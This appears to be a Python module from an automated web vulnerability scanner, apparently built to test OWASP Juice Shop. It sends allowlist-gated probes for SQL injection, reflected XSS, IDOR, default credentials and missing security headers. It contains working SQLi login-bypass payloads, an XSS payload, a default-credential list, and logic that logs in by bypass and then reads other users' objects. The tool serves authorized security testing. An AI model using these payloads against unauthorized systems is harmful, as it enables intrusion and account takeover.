"""Execution stage: send real, crafted requests for each planned test case.

Every probe is conservative (a small number of requests), captures the actual
request/response as evidence, and is hard-gated by the allowlist. Probes report
*suspicion* only — the triage stage decides what is real. Nothing here is
destructive: no data is written, deleted, or exfiltrated.
"""
from __future__ import annotations

import json
import re
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import httpx

from ..config import get_settings
from ..models import Evidence, RawResult, TestCase
from ..safety.allowlist import assert_allowed

# --- Payloads / signatures ----------------------------------------------------

_SQL_PAYLOADS = ["'", "' OR '1'='1", "1' OR '1'='1' -- "]
# Authentication-bypass tautologies for login (sent in a JSON body).
_SQL_LOGIN_PAYLOADS = ["' OR 1=1--", "' OR '1'='1' --", "admin'--"]
_PATH_ID_RE = re.compile(r"\{[^}]+\}")
_LOGIN_PATH = "/rest/user/login"
_SQL_ERRORS = [
    "sql syntax",
    "sqlite",
    "sqlexception",
    "unterminated",
    "odbc",
    "syntax error",
    "mysql",
    "psql",
    "near \"",
    "unexpected token",
]
_XSS_MARKER = "sentinelXSS7h3r3"
_XSS_PAYLOAD = f"<svg/onload=alert('{_XSS_MARKER}')>"

_SECURITY_HEADERS = {
    "content-security-policy": "Missing Content-Security-Policy.",
    "x-frame-options": "Missing X-Frame-Options (clickjacking).",
    "strict-transport-security": "Missing HSTS.",
    "x-content-type-options": "Missing X-Content-Type-Options: nosniff.",
}

_COMMON_CREDS = [
    ("admin@juice-sh.op", "admin123"),
    ("admin", "admin"),
    ("test@test.com", "test"),
]


def _set_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    query = dict(parse_qsl(parsed.query))
    query[param] = value
    return urlunparse(parsed._replace(query=urlencode(query)))


def _origin(url: str) -> str:
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"


def _set_id(url: str, param: str, value: str) -> str:
    """Substitute an object id, whether it's a path placeholder or a query param."""
    if _PATH_ID_RE.search(url):
        return _PATH_ID_RE.sub(str(value), url, count=1)
    # Path ending in a bare numeric segment (e.g. /api/BasketItems/1).
    parsed = urlparse(url)
    if re.search(r"/\d+/?$", parsed.path):
        new_path = re.sub(r"/\d+(/?)$", f"/{value}\\1", parsed.path)
        return urlunparse(parsed._replace(path=new_path))
    return _set_param(url, param, value)


def _is_login(case: TestCase) -> bool:
    return (
        case.method.upper() == "POST"
        or "login" in case.target_endpoint.lower()
        or (case.parameter or "").lower() in ("email", "password")
    )


async def _login_token(client: httpx.AsyncClient, origin: str) -> tuple[str | None, str]:
    """Authenticate against the target to exercise authenticated access controls.

    Tries well-known default credentials first, then a SQLi auth-bypass. Returns
    (token, identity) or (None, "") — used only to demonstrate missing object-
    level authorization on the authorized target. Never persisted.
    """
    login_url = urljoin(origin + "/", _LOGIN_PATH.lstrip("/"))
    attempts = [{"email": e, "password": p} for e, p in _COMMON_CREDS]
    attempts.append({"email": _SQL_LOGIN_PAYLOADS[0], "password": "x"})
    for body in attempts:
        try:
            resp = await client.post(login_url, json=body)
        except httpx.HTTPError:
            continue
        if resp.status_code == 200:
            try:
                token = resp.json().get("authentication", {}).get("token")
            except (ValueError, AttributeError):
                token = None
            if token:
                return token, body["email"]
    return None, ""


def _client() -> httpx.AsyncClient:
    settings = get_settings()
    return httpx.AsyncClient(
        timeout=settings.request_timeout,
        headers={"User-Agent": settings.user_agent},
        follow_redirects=False,
    )


def _snippet(text: str, limit: int = 600) -> str:
    return text[:limit]


async def execute_case(case: TestCase) -> RawResult:
    """Dispatch a single test case to its probe."""
    assert_allowed(case.target_endpoint)
    technique = case.technique
    handler = {
        "sql_injection": _probe_sqli,
        "reflected_xss": _probe_xss,
        "idor": _probe_idor,
        "broken_auth": _probe_broken_auth,
        "security_headers": _probe_headers,
    }.get(technique)

    if handler is None:
        return RawResult(
            case=case,
            suspicious=False,
            evidence=Evidence(request_line=f"(unsupported technique {technique})"),
        )
    return await handler(case)


# --- Individual probes --------------------------------------------------------

async def _probe_sqli(case: TestCase) -> RawResult:
    # Login endpoints take a JSON body, not a query string — inject there.
    if _is_login(case):
        return await _probe_sqli_login(case)
    param = case.parameter or "q"
    async with _client() as client:
        for payload in _SQL_PAYLOADS:
            url = _set_param(case.target_endpoint, param, payload)
            try:
                resp = await client.get(url)
            except httpx.HTTPError as exc:
                continue
            body_lower = resp.text.lower()
            hit = next((e for e in _SQL_ERRORS if e in body_lower), None)
            if hit or resp.status_code >= 500:
                return RawResult(
                    case=case,
                    suspicious=True,
                    raw_indicator=hit or f"HTTP {resp.status_code}",
                    evidence=Evidence(
                        request_line=f"GET {url}",
                        response_status=resp.status_code,
                        response_snippet=_snippet(resp.text),
                        indicator=(
                            f"SQL error signature {hit!r} in response"
                            if hit
                            else f"Server error {resp.status_code} on injected input"
                        ),
                    ),
                )
    return RawResult(
        case=case,
        suspicious=False,
        evidence=Evidence(
            request_line=f"GET {_set_param(case.target_endpoint, param, _SQL_PAYLOADS[0])}",
            indicator="No SQL error signatures observed.",
        ),
    )


async def _probe_sqli_login(case: TestCase) -> RawResult:
    """SQLi against a JSON login endpoint — inject a tautology in the email field
    and look for an authentication-bypass (a token issued for bogus credentials)
    or a SQL error. This is the Juice Shop ' OR 1=1-- bypass."""
    inject_field = (case.parameter or "email").lower()
    if inject_field not in ("email", "password"):
        inject_field = "email"
    async with _client() as client:
        for payload in _SQL_LOGIN_PAYLOADS:
            body = {"email": "sentinel@probe.test", "password": "sentinel-nope"}
            body[inject_field] = payload
            try:
                resp = await client.post(case.target_endpoint, json=body)
            except httpx.HTTPError:
                continue
            text = resp.text
            low = text.lower()
            auth_bypass = resp.status_code == 200 and (
                '"token"' in low or "authentication" in low or "bearer" in low
            )
            sql_err = next((e for e in _SQL_ERRORS if e in low), None)
            if auth_bypass or sql_err or resp.status_code >= 500:
                safe_body = dict(body)
                safe_body["password"] = "***"
                return RawResult(
                    case=case,
                    suspicious=True,
                    raw_indicator=(
                        "auth bypass via tautology" if auth_bypass
                        else (sql_err or f"HTTP {resp.status_code}")
                    ),
                    evidence=Evidence(
                        request_line=f"POST {case.target_endpoint}",
                        request_body=json.dumps(safe_body),
                        response_status=resp.status_code,
                        response_snippet=_snippet(text),
                        indicator=(
                            "Login returned an authentication token for a SQL "
                            f"tautology payload in {inject_field!r} — SQLi auth bypass."
                            if auth_bypass
                            else (
                                f"SQL error signature {sql_err!r} in login response."
                                if sql_err
                                else f"Server error {resp.status_code} on injected login input."
                            )
                        ),
                    ),
                )
    return RawResult(
        case=case,
        suspicious=False,
        evidence=Evidence(
            request_line=f"POST {case.target_endpoint}",
            request_body=json.dumps({"email": _SQL_LOGIN_PAYLOADS[0], "password": "***"}),
            indicator="No auth bypass or SQL error from injected login payloads.",
        ),
    )


async def _probe_xss(case: TestCase) -> RawResult:
    param = case.parameter or "q"
    url = _set_param(case.target_endpoint, param, _XSS_PAYLOAD)
    async with _client() as client:
        try:
            resp = await client.get(url)
        except httpx.HTTPError as exc:
            return RawResult(
                case=case,
                suspicious=False,
                evidence=Evidence(request_line=f"GET {url}", indicator=str(exc)),
            )
    reflected_raw = _XSS_PAYLOAD in resp.text
    marker_only = _XSS_MARKER in resp.text
    ctype = resp.headers.get("content-type", "")
    suspicious = reflected_raw and "html" in ctype
    return RawResult(
        case=case,
        suspicious=suspicious,
        raw_indicator="unescaped reflection" if suspicious else None,
        evidence=Evidence(
            request_line=f"GET {url}",
            response_status=resp.status_code,
            response_snippet=_snippet(resp.text),
            indicator=(
                "Payload reflected unescaped in an HTML response."
                if suspicious
                else (
                    "Marker reflected but encoded/escaped."
                    if marker_only
                    else "Payload not reflected."
                )
            ),
        ),
    )


async def _probe_idor(case: TestCase) -> RawResult:
    """Test for missing object-level authorization (IDOR / BOLA).

    Authenticates with a single low-trust identity, then reads sequential object
    ids. If one account can read multiple distinct objects (belonging to other
    users) the endpoint is missing per-object access control.
    """
    param = case.parameter or "id"
    origin = _origin(case.target_endpoint)
    async with _client() as client:
        token, identity = await _login_token(client, origin)
        auth_headers = {"Authorization": f"Bearer {token}"} if token else {}

        statuses: list[tuple[str, int, int]] = []  # (shown, status, length)
        for value in ("1", "2", "3"):
            url = _set_id(case.target_endpoint, param, value)
            try:
                resp = await client.get(url, headers=auth_headers)
            except httpx.HTTPError:
                continue
            shown = urlparse(url).path + (f"?{urlparse(url).query}" if urlparse(url).query else "")
            statuses.append((shown, resp.status_code, len(resp.content)))

        oks = [s for s in statuses if s[1] == 200]
        # Suspicious if a single authenticated identity can read ≥2 sequential
        # objects (or ≥2 readable unauthenticated, if no login was possible).
        suspicious = len(oks) >= 2
        detail = "; ".join(f"{s}->{st}({ln}B)" for s, st, ln in statuses)
        auth_note = f"authenticated as {identity!r}" if token else "unauthenticated"
        return RawResult(
            case=case,
            suspicious=suspicious,
            raw_indicator=(
                f"{len(oks)} sequential objects readable ({auth_note})"
                if suspicious else None
            ),
            evidence=Evidence(
                request_line=f"GET {case.target_endpoint} [{param}=1,2,3] ({auth_note})",
                request_body=(f"Authorization: Bearer <token for {identity}>" if token else None),
                response_status=oks[0][1] if oks else (statuses[0][1] if statuses else None),
                response_snippet=detail,
                indicator=(
                    f"A single identity ({auth_note}) read {len(oks)} distinct "
                    "sequential objects — missing object-level authorization (IDOR/BOLA)."
                    if suspicious
                    else f"No multi-object access observed ({auth_note})."
                ),
            ),
        )


async def _probe_broken_auth(case: TestCase) -> RawResult:
    """Lightweight check: try a very small set of well-known default creds.

    Only run against the authorized target. Stops at the first success.
    """
    login_url = case.target_endpoint
    async with _client() as client:
        for email, password in _COMMON_CREDS:
            try:
                resp = await client.post(
                    login_url,
                    json={"email": email, "password": password},
                )
            except httpx.HTTPError:
                continue
            body = resp.text.lower()
            success = resp.status_code == 200 and (
                "token" in body or "authentication" in body or "bearer" in body
            )
            if success:
                return RawResult(
                    case=case,
                    suspicious=True,
                    raw_indicator=f"default creds accepted ({email})",
                    evidence=Evidence(
                        request_line=f"POST {login_url}",
                        request_body=f'{{"email":"{email}","password":"***"}}',
                        response_status=resp.status_code,
                        response_snippet=_snippet(resp.text),
                        indicator=f"Login succeeded with well-known credentials {email}.",
                    ),
                )
    return RawResult(
        case=case,
        suspicious=False,
        evidence=Evidence(
            request_line=f"POST {login_url}",
            indicator="No tested default credentials were accepted.",
        ),
    )


async def _probe_headers(case: TestCase) -> RawResult:
    async with _client() as client:
        try:
            resp = await client.get(case.target_endpoint)
        except httpx.HTTPError as exc:
            return RawResult(
                case=case,
                suspicious=False,
                evidence=Evidence(request_line=f"GET {case.target_endpoint}", indicator=str(exc)),
            )
    present = {k.lower() for k in resp.headers}
    missing = [msg for h, msg in _SECURITY_HEADERS.items() if h not in present]
    return RawResult(
        case=case,
        suspicious=bool(missing),
        raw_indicator=f"{len(missing)} security headers missing" if missing else None,
        evidence=Evidence(
            request_line=f"GET {case.target_endpoint}",
            response_status=resp.status_code,
            response_snippet="\n".join(missing) or "All baseline headers present.",
            indicator="; ".join(missing) if missing else "Baseline security headers present.",
        ),
    )
